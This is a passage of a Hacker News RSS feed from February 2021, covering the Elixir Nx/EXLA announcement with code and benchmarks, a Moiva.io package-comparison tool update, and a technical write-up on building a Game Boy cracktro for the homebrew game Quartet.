  </span><span>grad</span><span data-group-id="5969204985-3">(</span><span>t</span><span>,</span><span> </span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="5969204985-4">(</span><span>t</span><span data-group-id="5969204985-4">)</span><span> </span><span>/</span><span> </span><span>Nx</span><span>.</span><span>sum</span><span data-group-id="5969204985-5">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="5969204985-6">(</span><span>t</span><span data-group-id="5969204985-6">)</span><span data-group-id="5969204985-5">)</span><span data-group-id="5969204985-3">)</span><span>
</span><span data-group-id="5969204985-2">end</span></code></pre>
<p>
Finally, this computation graph can also be handed out to different compilers. As an example, we have implemented bindings for <a href="https://www.tensorflow.org/xla/">Google‚Äôs XLA</a> compiler, called EXLA. We can ask the <code>softmax</code> function to use this new compiler with a module attribute:</p>
<pre><code><span>@defn_compiler</span><span> </span><span data-group-id="5313365207-1">{</span><span>EXLA</span><span>,</span><span> </span><span>client</span><span>:</span><span> </span><span>:host</span><span data-group-id="5313365207-1">}</span><span>
</span><span>defn</span><span> </span><span>softmax</span><span data-group-id="5313365207-2">(</span><span>t</span><span data-group-id="5313365207-2">)</span><span> </span><span data-group-id="5313365207-3">do</span><span>
  </span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="5313365207-4">(</span><span>t</span><span data-group-id="5313365207-4">)</span><span> </span><span>/</span><span> </span><span>Nx</span><span>.</span><span>sum</span><span data-group-id="5313365207-5">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="5313365207-6">(</span><span>t</span><span data-group-id="5313365207-6">)</span><span data-group-id="5313365207-5">)</span><span>
</span><span data-group-id="5313365207-3">end</span></code></pre>
<p>
Once <code>softmax</code> is called, <code>Nx.Defn</code> will invoke <code>EXLA</code> to emit a just-in-time and highly-specialized compiled version of the code, tailored to the tensor type and shape. By passing <code>client: :cuda</code> or <code>client: :rocm</code>, the code can be compiled for the GPU. For reference, here are some benchmarks of the function above when called with a tensor of one million random float values on different clients:</p>
<pre><code>Name                       ips        average  deviation         median         99th %
xla gpu f32 keep      15308.14      0.0653 ms    ¬±29.01%      0.0638 ms      0.0758 ms
xla gpu f64 keep       4550.59        0.22 ms     ¬±7.54%        0.22 ms        0.33 ms
xla cpu f32             434.21        2.30 ms     ¬±7.04%        2.26 ms        2.69 ms
xla gpu f32             398.45        2.51 ms     ¬±2.28%        2.50 ms        2.69 ms
xla gpu f64             190.27        5.26 ms     ¬±2.16%        5.23 ms        5.56 ms
xla cpu f64             168.25        5.94 ms     ¬±5.64%        5.88 ms        7.35 ms
elixir f32                3.22      311.01 ms     ¬±1.88%      309.69 ms      340.27 ms
elixir f64                3.11      321.70 ms     ¬±1.44%      322.10 ms      328.98 ms

Comparison:
xla gpu f32 keep      15308.14
xla gpu f64 keep       4550.59 - 3.36x slower +0.154 ms
xla cpu f32             434.21 - 35.26x slower +2.24 ms
xla gpu f32             398.45 - 38.42x slower +2.44 ms
xla gpu f64             190.27 - 80.46x slower +5.19 ms
xla cpu f64             168.25 - 90.98x slower +5.88 ms
elixir f32                3.22 - 4760.93x slower +310.94 ms
elixir f64                3.11 - 4924.56x slower +321.63 ms</code></pre>
<p>
Where <code>keep</code> indicates the tensor was kept on the device instead of being transferred back to Elixir. You can see the benchmark in the <a href="https://github.com/elixir-nx/nx/tree/main/exla/bench"><code>bench</code></a> directory and find some examples in the <a href="https://github.com/elixir-nx/nx/tree/main/exla/examples"><code>examples</code></a> directory of the EXLA project.</p>
<h3>
Compiling numerical definitions</h3>
<p>
Before moving forward, it is important for us to take a look at how numerical definitions are compiled. For example, take the <code>softmax</code> function:</p>
<pre><code><span>defn</span><span> </span><span>softmax</span><span data-group-id="5791259392-1">(</span><span>t</span><span data-group-id="5791259392-1">)</span><span> </span><span data-group-id="5791259392-2">do</span><span>
  </span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="5791259392-3">(</span><span>t</span><span data-group-id="5791259392-3">)</span><span> </span><span>/</span><span> </span><span>Nx</span><span>.</span><span>sum</span><span data-group-id="5791259392-4">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="5791259392-5">(</span><span>t</span><span data-group-id="5791259392-5">)</span><span data-group-id="5791259392-4">)</span><span>
</span><span data-group-id="5791259392-2">end</span></code></pre>
<p>
One might think that Elixir takes the AST of the softmax function above and compiles it directly to the GPU. However, that‚Äôs not the case! Numerical definitions are first compiled to Elixir code that will emit the computation graph and this computation graph is then compiled to the GPU. The multiple stages go like this:</p>
<pre><code>Elixir AST
-&gt; compiles to .beam (Erlang VM bytecode)
   -&gt; executes into defn AST
      -&gt; compiles to GPU</code></pre>
<p>
This multi-stage programming is made possible thanks to Elixir macros. For example, when you see a conditional inside <code>defn</code>, that conditional looks exactly like Elixir conditionals, but it will be compiled to an accelerator:</p>
<pre><code><span>defn</span><span> </span><span>softmax</span><span data-group-id="8102420814-1">(</span><span>t</span><span data-group-id="8102420814-1">)</span><span> </span><span data-group-id="8102420814-2">do</span><span>
  </span><span>if</span><span> </span><span>Nx</span><span>.</span><span>any?</span><span data-group-id="8102420814-3">(</span><span>t</span><span data-group-id="8102420814-3">)</span><span> </span><span data-group-id="8102420814-4">do</span><span>
    </span><span>-</span><span>1</span><span>
  </span><span data-group-id="8102420814-4">else</span><span>
    </span><span>1</span><span>
  </span><span data-group-id="8102420814-4">end</span><span>
</span><span data-group-id="8102420814-2">end</span></code></pre>
<p>
In a nutshell, <code>defn</code> provides us with a subset of Elixir for numerical computations that can be compiled to specific hardware, such as CPU, GPU, and other accelerators. All of this was possible without making changes or forking the language.</p>
<p>
And while <code>defn</code> is a subset of the language, it is a considerable one. You will find support for:</p>
<ul>
  <li>
Mathematical operators  </li>
  <li>
Pipes (<code>|&gt;</code>), module attributes, the access syntax (i.e. <code>tensor[1][1..-1]</code>), etc  </li>
  <li>
Elixir macros constructs (imports, aliases, etc)  </li>
  <li>
Control-flow with conditionals (both <code>if</code> and <code>cond</code>), loops (coming soon), etc  </li>
  <li>
Transformations, an explicit mechanism to invoke Elixir code from a <code>defn</code> (which enables constructs such as <code>grad</code>)  </li>
</ul>
<p>
And more coming down the road.</p>
<h2>
Why functional programming?</h2>
<p>
At this point, you may be wondering: is functional programming a good fit for numerical computing? One of the main concerns is that immutability can be expensive when working with large blobs of memory. And that‚Äôs a valid concern! In fact, when using the default tensor backend, tensors will be backed by Elixir binaries which are copied on every operation. That‚Äôs why it was critical for us to design <code>Nx</code> with pluggable backends from day one.</p>
<p>
However, as we move to higher-level abstractions, such as numerical definitions, we will start to reap the benefits of functional programming.</p>
<p>
For example, in order to build computation graphs, immutability becomes an indispensable tool both in terms of implementation and in terms of reasoning. The JAX library for Python, which has been one of the guiding lights for Nx design, also promotes functional and immutable principles:</p>
<blockquote>
  <p>
<em>JAX is intended to be used with a functional style of programming</em>  </p>
  <p>
‚Äî <a href="https://jax.readthedocs.io/en/latest/jax.ops.html?highlight=functional#indexed-update-operators">JAX Docs</a>  </p>
</blockquote>
<blockquote>
  <p>
<em>Unlike NumPy arrays, JAX arrays are always immutable</em>  </p>
  <p>
‚Äî <a href="https://jax.readthedocs.io/en/latest/notebooks/thinking_in_jax.html?highlight=immutable#JAX-vs.-NumPy">JAX Docs</a>  </p>
</blockquote>
<p>
Similarly, frameworks like <a href="https://thinc.ai/">Thinc.ai</a> argue that functional programming can provide better abstractions and more composable building blocks for deep learning libraries.</p>
<p>
We hope that, by exploring these ideas in a language that is functional by design, Elixir can bring new ideas and insights at the higher-level.</p>
<h2>
What is next?</h2>
<p>
There is a lot of work ahead of us ‚Ä¶</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/nx-numerical-elixir-is-now-publicly-available">https://dashbit.co/blog/nx-numerical-elixir-is-now-publicly-available</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/nx-numerical-elixir-is-now-publicly-available</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179373</guid>
            <pubDate>Thu, 18 Feb 2021 13:08:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Split Keyboards Gallery]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 106 (<a href="https://news.ycombinator.com/item?id=26179311">thread link</a>) | @Symbiote
<br/>
February 18, 2021 | https://aposymbiont.github.io/split-keyboards/ | <a href="https://web.archive.org/web/*/https://aposymbiont.github.io/split-keyboards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://aposymbiont.github.io/split-keyboards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179311</guid>
            <pubDate>Thu, 18 Feb 2021 13:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Moiva.io v3: a universal tool to Evaluate, Discover and Compare software]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26179252">thread link</a>) | @alexey2020
<br/>
February 18, 2021 | https://moiva.io/blog/universal-tool-to-evaluate-discover-compare-software | <a href="https://web.archive.org/web/*/https://moiva.io/blog/universal-tool-to-evaluate-discover-compare-software">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <div>
    <p><span>Feb 17 2021</span>
    <span>¬∑ written by</span>
    <a href="https://twitter.com/_aantipov" target="_blank">Alexey Antipov</a>
  </p></div>

  <p>Hi, Alexey is here. I have some exciting news for you!</p>
<p>I rewrote <a href="https://moiva.io/">Moiva.io</a> from scratch and made it a Universal and Flexible tool to suit a taste of every software developer be they a JavaScript, Python or [put your favorite language here] developer.</p>
<p>This article marks a third major release of Moiva.</p>
<p><img src="https://moiva.io/blog/images/universal-tool/full.png" alt="A screenshot of Moiva.io showing comparison of Vue and Svelte npm packages"></p>
<h2 id="whats-new-in-short">What‚Äôs new (in short)</h2>
<ul>
<li>ability to search for and get data for any GitHub repository in addition to search and comparison of NPM packages.</li>
<li>possibility to bring (relatively easy) Search, Suggestion, and Comparison capabilities to other programming languages' package management systems like <a href="https://mvnrepository.com/">Maven</a> (Java), <a href="https://pypi.org/">PIP</a> (Python), or <a href="https://packagist.org/">Packagist</a> (PHP).</li>
<li>last but not least, Moiva got <a href="https://github.com/aantipov/moiva">open-sourced</a>.</li>
</ul>
<h2 id="why-i-did-it">Why I did it</h2>
<p>At first, I wanted to focus on JavaScript ecosystem, making npm packages first-class citizens in Moiva.io.</p>
<p>The goal was to provide developers with a good tool to evaluate and compare npm packages in different dimensions - Popularity, Maintenance, Security, etc.</p>
<p>But very soon I realized that there are many JavaScript-related projects which don‚Äôt have any published npm packages.</p>
<p>Think of, for example, frameworks like <code>Meteor</code>.</p>
<p>Moiva.io could potentially be useful for the evaluation of those projects as well thanks to GitHub charts (Contributors, Issues, Commits Frequency, etc.), but search functionality was limited to npm packages only and everything was built around the concept of npm packages.</p>
<p>On the other hand, if Moiva gets opened up to the search, evaluation and comparison of <strong>any</strong> GitHub project, it will essentially convert Moiva into a universal tool and make it useful to many more developers.</p>
<p>So I got convinced that Moiva should become more Universal and Agile, I just need to come up with a good harmonious concept of how it should look, work and how to implement it.</p>
<h2 id="aha-moment">AHA moment</h2>
<p>In the beginning, the idea of supporting GitHub looked vague and blurred. I didn‚Äôt have any good idea how to put together existing functionality for npm packages and the new one for GitHub repositories.</p>
<p>I could implement separate pages for npm and GitHub, but that was not ideal. Both have a lot in common when comparing JavaScript projects.</p>
<p>Then the <code>AHA</code> moment came - everything became clear, I realized how to put together different things and since then I was unstoppable.</p>
<p>Here is the essence of the solution.</p>
<h3 id="one-search-for-all">One Search for All</h3>
<p>The same single search field can be used to search for both npm packages and GitHub repositories. It can be easily achieved via search modifiers (prefixes).</p>
<p>The default search is for GitHub.</p>
<p>The search prefixed with <code>n:</code> is for npm packages.</p>
<p><img src="https://moiva.io/blog/images/universal-tool/search.gif" alt="A gif showing how Search field at Moiva.io works: search for NPM packages and GitHub repositories"></p>
<p>What I like about that solution is that it can be easily extended in the future to search for other things as well.</p>
<h3 id="show-only-relevant-charts">Show only relevant charts</h3>
<p>If a user selects only GitHub repositories without related npm packages, then we can just hide npm-related charts. No reason to show them.</p>
<p>It‚Äôs similar to how ThoughtWorks TechRadar and Developer Usage charts work - they are shown only when there is data for the selected npm packages.</p>
<p>At the same time, if the user selects a mix of npm and Github projects, we will show npm-related charts for the selected npm packages.</p>
<h3 id="how-about-urls">How about URLs</h3>
<p>Every comparison a user makes in Moiva should be easily reproducible via URL.</p>
<p>It means that Moiva should be able to derive from the URL what information to load, what to put into comparison.</p>
<p>When npm packages were the only citizens in the Moiva world, the task was solved easily - the selected npm packages' names were listed in a query parameter: <code>https://moiva.io/?compare=react+svelte+vue</code>.</p>
<p>Having 2 types of citizens, npm and Github, where one depends on the other, complicates things a bit. Moreover, we want to build a future-proof solution that can incorporate other types of citizens like PIP and Maven.</p>
<p>GitHub has a broader scope than npm and my first idea was to replace URL npm identifiers with GitHub identifiers. But there are 2 problems with it:</p>
<ul>
<li>it‚Äôs not clear how to derive the npm package from the GitHub repository. At least I couldn‚Äôt find the solution for that.</li>
<li>one GitHub repo can be a source of multiple npm packages. There is no 1:1 connection.</li>
</ul>
<p>It lead me to the conclusion that GitHub and npm should be referenced separately in the URL.</p>
<p>So I just decided to have separate query parameters: <code>https://moiva.io/?npm=svelte+vue&amp;github=meteor/meteor</code>.</p>
<h3 id="github-and-npm-reconciliation">GitHub and NPM reconciliation</h3>
<p>Imagine two situations:</p>
<ol>
<li>a user selects Vue as an npm package.</li>
<li>a user selects Vue as a GitHub repo.</li>
</ol>
<p>In the first situation Moiva shows npm-related data and charts like npm Downloads. In the second situation, it doesn‚Äôt.</p>
<p>But is it fair? Most probably a user would expect to see the same set of information in both cases, right?</p>
<p>Could we still somehow derive information about the npm package from the GitHub repository? If yes, then we could show npm data for the selected GitHub repository.</p>
<p>Turns out we can make use of <a href="https://github.com/aantipov/moiva-catalog">Moiva Catalog</a> which was built to implement the Suggestions mechanism.
For every listed GitHub repository we can add a name of the npm package if there is one. It means we can solve the problem of the reconciliation for items listed in the catalog. And I think it‚Äôs a good enough solution with which we can cover the most popular libraries.</p>
<p>We just need to take care of some details and edge cases.</p>
<ol>
<li>If a repository does have an npm package, but that package is just one of the repo‚Äôs ‚Äúby-products‚Äù, then probably it doesn‚Äôt make sense to show that npm package data when selecting the repository. To solve that problem, an additional flag <code>isNpmCoreArtifact</code> in the catalog can be used to indicate the ‚Äúrole‚Äù of the npm package.</li>
<li>If we successfully derive npm data from the GitHub repository, it means we essentially display the same information for both npm and GitHub and have different URL identifiers for the same page. It‚Äôs not good, especially in terms of SEO. So I decided to use npm package‚Äôs name as a URL identifier in such cases. Try load <code>https://moiva.io/?github=vuejs/vue</code> url and see what happens ;=)</li>
</ol>
<h3 id="data-model">Data model</h3>
<p>I mentioned just a few of the problems I had to solve. There were, of course, many others, like duplication handling, aliases, SEO, etc.</p>
<p>Most of the problems got a straightforward solution once I implemented a proper Data Model - I came up with a new abstraction called ‚ÄúLibrary‚Äù and provided it with certain properties and behavior.</p>
<p>If you are interested, you can check the <a href="https://github.com/aantipov/moiva/">repository‚Äôs readme</a> for more details about the Library concept.</p>
<h2 id="whats-next">What‚Äôs next</h2>
<p>I clearly see a huge potential for <a href="https://moiva.io/">Moiva.io</a> to become a really useful tool to many developers.</p>
<p>It can grow and become better in different directions.
I will mention a few of them which look most important to me:</p>
<ul>
<li>enable search/suggestion/comparison for more languages' package systems (Maven, PIP, etc.).</li>
<li>add more useful charts and data, both generic and language/package-system specific.</li>
<li>improve significantly the alternatives suggestion system. Currently, it‚Äôs based on <a href="https://github.com/aantipov/moiva-catalog">Moiva Catalog</a> and needs a lot of data to be put there. I see a way how the community could help and contribute there.</li>
</ul>
<hr>
<p>I hope I didn‚Äôt waste your time and you found the reading and the project itself interesting.</p>
<p>Stay tuned and Subscribe to the newsletter. I want to publish more interesting content about Moiva development.</p>

</div></div>]]>
            </description>
            <link>https://moiva.io/blog/universal-tool-to-evaluate-discover-compare-software</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179252</guid>
            <pubDate>Thu, 18 Feb 2021 12:55:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taking a Stand in the War on General-Purpose Computing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26179176">thread link</a>) | @TLM275
<br/>
February 18, 2021 | http://cheapskatesguide.org/articles/war-on-gp-computing.html | <a href="https://web.archive.org/web/*/http://cheapskatesguide.org/articles/war-on-gp-computing.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://cheapskatesguide.org/articles/war-on-gp-computing.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179176</guid>
            <pubDate>Thu, 18 Feb 2021 12:47:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making cracktro for a Game Boy game ‚Äì Quartet intro]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26179026">thread link</a>) | @retro_guy
<br/>
February 18, 2021 | https://eldred.fr/quartet | <a href="https://web.archive.org/web/*/https://eldred.fr/quartet">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="top">
			<main>
	

	<p><a href="https://makrill.itch.io/quartet"><em>Quartet</em></a> is a great homebrew Game Boy game, published by Mackerel Interactive in early 2021.
So why not do like the good old days and <a href="https://www.pouet.net/prod.php?which=87951">crack it</a>?</p>

<p>In this post(-mortem?), I‚Äôll explain what went into creating this cracktro.
I‚Äôll keep the most technical details out of the way until the end of this post, so it should still be a good read, even if you don‚Äôt have a technical background.</p>

<!--more-->

<h2 id="context">Context</h2>

<p><a href="https://github.com/dalton-tulou">Dalton</a> released this game on Jan 8th, 2021.
It‚Äôs honestly a pretty good game in its own right, also well polished for all of DMG, SGB and GBC.</p>

<p>By the way, Dalton <a href="https://www.pouet.net/user.php?who=1289">was a demoscener back then</a>, notably on the Game Boy.
He programmed <a href="https://www.pouet.net/prod.php?which=80612">a trainer for a previous homebrew release</a>, which sparked this idea.</p>

<p>So, we set out to make a cracktro, and it had to be as polished as the base game.</p>

<h2 id="decisions">Decisions</h2>

<p>First order of business (actually second, since I started REing the ROM first) was deciding what we wanted the cracktro to be.</p>

<p>The original plan was to have something very parallax-heavy, simulating a bunch of layers; perhaps a landscape?
This eventually led to:</p>

<blockquote>
  <p>&lt;ISSOtm&gt; Playing on a Game Boy on the back seat of a car at night..?</p>
</blockquote>

<p>The plan stuck.
I drafted something real quick:</p>

<figure>
    <img src="https://eldred.fr/assets/quartet/storyboard.png" alt="Rough storyboard of the scene">
    <figcaption><i>Made quickly with GIMP, at 160√ó144 to be sure of proportions.</i></figcaption>
</figure>

<p>Doc proposed a design fairly quickly:</p>

<figure>
    <img src="https://eldred.fr/assets/quartet/draft.gif" alt="Initial night-time draft">
    <figcaption><i>Honestly, this is pretty much the final, lol</i></figcaption>
</figure>

<p>I send pictures of me holding a GBC for reference, and he reworked the ‚Äúcube‚Äù, in his own terms :P</p>

<p>After that, I fired up <a href="https://github.com/aseprite/aseprite">Aseprite</a> to design the light‚Äôs animation:</p>

<figure>
    <img src="https://eldred.fr/assets/quartet/light.gif" alt="Light animation mockup">
    <figcaption><i>You might spot slight differences to the final. We had to make some cuts...</i></figcaption>
</figure>

<h2 id="first-implementation">First implementation</h2>

<p>I set out to display this on the actual console.
(Well, emulators, since they have debuggers :P)
I started with the monochrome console first, since it would be quicker and easier.
Believe it or not, but we were already hitting a snag.</p>

<figure>
    <img src="https://eldred.fr/assets/quartet/dmg.png" alt="Screenshot of a DMG render of the draft">
    <figcaption><i>Can you spot the problem?</i></figcaption>
</figure>

<p>See, the Game Boy only has 4 colors.
Dark for the background, dark gray for the character‚Äôs body and the window frame, light gray for the character‚Äôs head and arms, and white for the Game Boy and the light.</p>

<p>Wait, but there‚Äôs supposed to be light on top of the Game Boy!</p>

<h3 id="terrible-lcd-to-the-rescue">Terrible LCD to the rescue!</h3>

<p><a href="https://gbdev.io/pandocs/#specifications">The Game Boy has a fairly cheap LCD</a>, in accordance with Gunpei Yokoi‚Äôs philosophy when designing the console.
Notably, it has a <em>really bad</em> response time: pixels take some time to change their luminance.
This tends to cause some kind of blur, especially when the whole screen moves at once.
Some games only ran at 30 fps on the Game Boy because it avoided that problem.</p>

<p>We exploit this slow response time by <a href="https://github.com/ISSOtm/quartet-intro/blob/c90fdf9534be5bd1c705db1d06761509ed5b3356/src/patch.asm#L595-L602"><em>blinking</em> the Game Boy between white and light gray</a>, effectively creating a 5th color!</p>

<video controls="" width="320px">
	<source src="https://eldred.fr/assets/quartet/first_light.webm" type="video/webm">
	<source src="https://eldred.fr/assets/quartet/first_light.mp4" type="video/mp4">

	Sorry, your browser doesn't support embedded videos, and GIFs don't play at 60 fps, so this effect doesn't show.
</video>

<p>This isn‚Äôt <em>great</em>, but it‚Äôs better than nothing; and besides, few are going to check it out on DMG, so it‚Äôs not that big of a deal.</p>

<h3 id="sprite-carpet">‚ÄúSprite carpet‚Äù</h3>

<p>Now, how to do this efficiently? We can‚Äôt just store two copies of the Game Boy graphic, that‚Äôd be woefully inefficient.
No, instead, we‚Äôll use color palettes.</p>

<p>See, many retro graphics did not store colors directly, since that would take a lot of memory.
Instead, pixels stored <em>indices</em>, which were then used to index <em>color palettes</em>.
This sacrificed color diversity for memory, and enabled some effects.</p>

<p>For example, to fade out the entire screen, you wouldn‚Äôt edit each pixel, you‚Äôd simply change the few colors they refer to.
Lightning flashes can also be performed cheaply by temporarily replacing all colors with white.
Etc etc.</p>

<p>In our case, we‚Äôll make the Game Boy (the one the character is holding, not the console this is running on :P) use a different color palette, and we‚Äôll simply blink one color in the palette.
‚Ä¶that said, the Game Boy only has <em>one</em> palette for its background.
Oh no!</p>

<p>(Note: I‚Äôll be using the term ‚Äúsprites‚Äù to refer to hardware <em>objects</em>, which is technically a misnomer‚Ä¶ but I‚Äôm too used to it. Sorry!)</p>

<p>Well, it <em>does</em> have two separate palettes for sprites‚Ä¶ but now the Game Boy graphic must be rendered using sprites.
Ugh.</p>

<p>Game Boy sprites have a fixed size: either 8√ó8 or 8√ó16 pixels (toggled by <a href="https://gbdev.io/pandocs/#lcdc-2-obj-size">a global switch</a>).
The Game Boy graphic is 35√ó57, so we‚Äôll need to use a lot of different sprites to make up the graphic.
Figuring out the optimal arrangement is a process I call ‚Äúsprite carpeting‚Äù, and which I do in GIMP using a <em>lot</em> of layers.</p>

<figure>
    <img src="https://eldred.fr/assets/quartet/carpet.png" alt="Screenshot of the finished carpeting process" width="70%">
    <figcaption><i>Using one layer per sprite, at 50% opacity, lets me see where there's overlap, which can potentially be optimized away.</i></figcaption>
</figure>

<p>This takes <em>hours</em> of painful work.
And then I have to manually encode all the positions in code‚Ä¶
And finally, I have to manually extract the relevant pixel data, and finally fix the couple mistakes I inevitably made.</p>

<figure>
    <img src="https://raw.githubusercontent.com/ISSOtm/quartet-intro/master/src/res/console_tiles.vert.png" alt="Final tile data for all the sprites" width="50%">
    <figcaption><i>This doesn't exactly match the carpeting above, since it had to change a bit down the line.</i></figcaption>
</figure>

<p>There are two reasons why the carpeting must be optimal, which pertain to two of the Game Boy‚Äôs limitations: ‚Äú<strong>10-per-line</strong>‚Äù and ‚Äú<strong>40 sprites</strong>‚Äù.
The Game Boy only has room for 40 sprites, though it‚Äôs possible to cheat a bit (as you‚Äôll see later).
The Game Boy‚Äôs <abbr title="Picture-Processing Unit">PPU</abbr> is only able to display 10 sprites <em>per scanline</em> (scanline = row of pixels).
Unlike the ‚Äú40 sprites‚Äù limitation, there is absolutely no way to bypass this one.</p>

<p>Anyway, you saw the GIF, the console displays nicely, and the light animation works.
Since it‚Äôs quite technical, I won‚Äôt get into how the light animation is achieved until near the end of this post.</p>

<p>Now that the base is there, let‚Äôs move on to the next step.</p>

<h2 id="text">Text</h2>

<p>First off, Doc‚Äô came up with a few fonts.</p>

<figure>
    <img src="https://eldred.fr/assets/quartet/font8x8.png" alt="8x8 font" width="50%">
    <figcaption><i>We quickly agreed that we'd need bigger characters for them to be easily legible. I still like how this looks.</i></figcaption>
</figure>

<figure>
    <img src="https://eldred.fr/assets/quartet/font_mid.png" alt="Middleground font" width="50%">
    <figcaption><i>Doc started working on 8x16 characters. I'm honestly impressed with how fast and good he is.</i></figcaption>
</figure>

<figure>
    <img src="https://eldred.fr/assets/quartet/font_final.png" alt="Final font" width="50%">
    <figcaption><i>This is essentially the final version. Shame that a lot of characters go unused in the final...</i></figcaption>
</figure>

<p>And then is a comment that I came to regret later‚Ä¶</p>

<blockquote>
  <p>&lt;doc&gt; sry its a mess to work with<br>
&lt;doc&gt; shouldve been thinkin about tile space<br>
&lt;ISSOtm&gt; That should be fine<br>
&lt;ISSOtm&gt;<br><img src="https://eldred.fr/assets/quartet/tiles.png" alt="View of the tiles loaded at that time"></p>
</blockquote>

<p>At this point, I had implemented the Game Boy graphic (green tiles near the top), the character‚Äôs light animation (dark tiles in the middle) and the background (the rest), and we had plenty of space remaining.
So I thought we‚Äôd be fine.
I had forgotten that I had yet to implement the Game Boy‚Äôs light animation‚Ä¶</p>

<h2 id="interlude-rom-update">Interlude: ROM update</h2>

<p>At this point, DevEd tried to compile the code, which mysteriously failed on some asset conversion on his Mac.
I sent him my build directory, and this worked‚Äîsomehow.
Comp00terz, I guess?
However, the ROM that he then built misbehaved <em>a lot</em>‚Äîas in, it crashed.
Why?</p>

<p>Our cracktro does not contain the original game‚Äôs code‚Äîinstead, we use <a href="https://rgbds.gbdev.io/docs/v0.4.2/rgblink.1#O">RGBLINK‚Äôs ‚Äúoverlay‚Äù feature</a> to essentially patch the ROM in-place.
This does require obtaining a legitimate copy of the game (the ‚Äúbase ROM‚Äù / ‚Äúbaserom‚Äù) in the first place, which was fairly easy‚Äîjust follow the link at the very top of this page to get one for free!</p>

<p>Except, as it turns out, Dalton had released a new version of the ROM!
And it also turned out that applying our patch to this version wasn‚Äôt viable, ugh.
I guess it also means that our cracktro preserves an earlier version of the game?
Anyway, I sent DevEd my base ROM, and off we went.</p>

<h2 id="download-more-ram">Download more RAM?</h2>

<p>At this point, I finished implementing the Game Boy‚Äôs light animation, and it was time to start working on the text.
First step was adding the font.</p>

<div><div><pre><code>ERROR: src/patch.asm(384):
    Assertion failed: Too many tiles! ($9950 &gt; $9800)
</code></pre></div></div>

<p>NOOOOOOOOOOOOOOO</p>

<p>We had more tiles than the Game Boy‚Äôs video RAM could contain at once.
Were we doomed?
<em>At once</em>‚Ä¶</p>

<p>It‚Äôs not necessary to keep the entire animation‚Äôs tiles loaded at all times, since only the current frame‚Äôs are displayed.
See where this is going?
We can load new tiles from ROM on each new frame!</p>

<h3 id="access-granted">Access granted</h3>

<p>The catch is that accessing the Game Boy‚Äôs video memory has to be the most annoying thing on that platform.
There are two chips that can try to access video RAM: the <abbr title="Central Processing Unit">CPU</abbr>, and the <abbr title="Picture Processing Unit">PPU</abbr>: the former as part of the game program, the latter to push pixels to the LCD.</p>

<p>Thing is, the PPU has priority over the CPU for accessing <abbr title="Video RAM">VRAM</abbr>.
While the PPU is ‚Äúlocking‚Äù VRAM, reads from the CPU return <code>$FF</code>, and importantly for us, <strong>all writes are silently ignored</strong>.
I won‚Äôt go into too much detail into this, but this, and the way the light animation is performed, severely restrict how much time can be spent writing to VRAM, and thus, how many tiles we can load per frame.</p>

<p>If you‚Äôre curious, <a href="https://github.com/ISSOtm/quartet-intro/blob/c90fdf9534be5bd1c705db1d06761509ed5b3356/src/patch.asm#L612-L633">this is the tile-streaming code</a>.</p>

<h2 id="music-time">Music time!</h2>

<p>Alright, the looks are good, so let‚Äôs start to work on the audio side of things.
Since we don‚Äôt have much free space, we were looking to reuse <em>Quartet</em>‚Äôs own sound player, if possible.
We knew it uses a modified version of <a href="http://gbdev.gg8.se/files/musictools/Aleksi%20Eeben/Carillon%20Editor.zip">Carillon</a>, we just had to figure out if it was possible to integrate with it, and how.</p>

<p>As it turned out, <em>Quartet</em> stores its music data compressed, and so fetches it all from RAM!
This was a blessing for us, since we just needed to do the same.
There was one catch, though: the pattern data format had been changed.</p>

<p>Music data, on many chiptune systems, has two parts: instrument data, which mostly defines their <a href="https://en.wikipedia.org/wiki/Timbre"><em>timbre</em></a>; and ‚Äúpattern‚Äù data, which is essentially a score, telling when to play a note with which instrument.</p>

<p>Instrument data was 1:1 with how vanilla Carillon generated it, but the pattern data went through some hoops I couldn‚Äôt wrap my head around.
In the end, we decided to <a href="https://github.com/ISSOtm/quartet-intro/blob/c90fdf9534be5bd1c705db1d06761509ed5b3356/src/patch.asm#L970-L974">reuse most of <em>Quartet</em>‚Äôs code</a>, but <a href="https://github.com/ISSOtm/quartet-intro/blob/c90fdf9534be5bd1c705db1d06761509ed5b3356/src/patch.asm#L975-L1196">embark the vanilla player‚Äôs version of the pattern-reading code</a>.
Figuring out how to reuse <em>Quartet</em>‚Äôs pattern-reading code could have spared us some ROM space, but definitely not headaches.
Oh well, the project is open-source, you‚Äôre welcome to try your hand at this if you‚Äôre interested :^)</p>

<p>You may be wondering about the SGB-specific music, but I‚Äôll ‚Ä¶</p></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eldred.fr/quartet">https://eldred.fr/quartet</a></em></p>]]>
            </description>
            <link>https://eldred.fr/quartet</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179026</guid>
            <pubDate>Thu, 18 Feb 2021 12:27:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I am a heroin user. I do not have a drug problem]]>
            </title>
            <description>
<![CDATA[
